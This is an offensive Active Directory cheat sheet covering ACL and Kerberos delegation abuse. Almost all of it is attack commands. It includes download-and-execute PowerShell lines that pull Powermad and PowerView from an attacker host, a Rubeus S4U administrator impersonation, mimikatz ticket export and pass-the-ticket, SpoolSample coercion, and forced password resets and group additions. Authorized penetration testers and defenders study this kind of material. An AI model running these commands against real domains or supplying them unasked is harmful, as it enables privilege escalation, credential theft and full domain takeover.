# Abusing ACLs

## Generic Write - Computer

### Kerberos Resource-based Constrained Delegation: Computer Object Takeover

Download powermad to create computer object

```
PS C:\Users> IEX(new-object net.webclient).downloadstring('http://192.168.X.Y/Powermad.ps1')
PS C:\Users> New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
```

Create a new raw security descriptor

```
PS C:\Users> IEX(new-object net.webclient).downloadstring('http://192.168.X.Y/PowerView.ps1')
PS C:\Users> $sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
PS C:\Users> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
PS C:\Users> $SDbytes = New-Object byte[] ($SD.BinaryLength)
PS C:\Users> $SD.GetBinaryForm($SDbytes,0)
```

Applying the security descriptor bytes to the target

```
PS C:\Users> Get-DomainComputer -Identity <GENERIC WRITE COMPUTER> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
PS C:\Users> $RBCDbytes = Get-DomainComputer <GENERIC WRITE COMPUTER> -Properties 'msds-allowedtoactonbehalfofotheridentity'| select -expand msds-allowedtoactonbehalfofotheridentity
PS C:\Users> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
```

Confirm Security descriptor is the same as the fake machine created

```
PS C:\Users> $Descriptor.DiscretionaryAcl
PS C:\Users> convertfrom-sid <SID from Descriptor>
```

Generate RC4 Hash

```
PS C:\Users> .\Rubeus.exe hash /password:h4x /user:myComputer$ /domain:Test.Domain
```

Impersonation

```
PS C:\Users> .\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/WriteComputer.Test.Domain /ptt
```

Confirm access to target computer

```
PS C:\Users> dir \\WriteComputer.Test.Domain\c$
```

Lateral Movement

```
PS C:\Users> .\psexec.exe -accepteula \GenericWrite.Test.Domain powershell
```

## Unconstrained Delegation

* forwardable tgt
* if used and compromise web service can steal all users tgts

### Enumeration

* trusted for delegation

```
Get-DomainComputer -unconstrained
```

* must compromise computer in question
* or compromise application on machine
* once compromised load up mimikatz

```
privilege::debug
load kiwi
kiwi_cmd sekurlsa::tickets /export
```

* copy the admin or user b64 .kirby ticket to a file
* remove new lines and spaces from the copy

```
echo -n $(cat admin.kirbi) | tr -d " " > admin2.kirbi
```

* Dont use kiwi\_cmd to load... normal meterpreter will work (kiwi failed on me)

```
kerberos_ticket_use /home/kali/admin2.kirbi
or
mimikatz # kerberos::ptt admin2.kirbi
```

* Now you can access resources that the user has access to

## Constrained Delegation

Hunting for user accounts that have kerberos constrained delegation enabled:

{% code title="attacker@target" %}
```
Get-NetUser -TrustedToAuth
```
{% endcode %}

Monitor for TGTs from the Domain Controller

```
Rubeus.exe monitor /interval:5 /filteruser:CDC01$
```

confirm printer spools is accessible

```
dir \\dc01\pipe\spoolss
```

using a second command prompt we’ll use  [https://github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample)

```
SpoolSample.exe [target] [capturesvr]
or
.\Rubeus.exe tgtdeleg
```

Request TGS for impersonated user

```
rubeus.exe ptt /ticket:oIFIjCCBR6g....  /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.fake.domain /dc:dc01.fake.domain /ptt
```

Confirm ticket is load

```
klist
```

confirm access to dc

```
dir \\dc0.fake.domain\c$
```

## GenericAll User

Check to see AD Rights for Generic ALl

```
Get-ObjectAcl -SamAccountName <CURRENT ACCOUNT> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
```

With all writes, you can change the password of the targeted user

```
net user TARGETME passwordreset123 /domain
```

## GenericAll Group

Check for groups with permissions to&#x20;

```csharp
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $.SecurityIdentifier.value) -Force; $} | Foreach-Object {if ($.Identity -eq $("$env:UserDomain$env:Username")) {$}}
```

If one of them has GenericAll in ActiveDirectoryRights, you can add a user to it

```
net group "TARGET GROUP" evil_account /add /domain
```

## ForceChangePassword

If we have `ExtendedRight` on `User-Force-Change-Password` object type, we can reset the user's password without knowing their current password:

```
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

```csharp
Set-DomainUserPassword -Identity TARGETUSER -Verbose
```
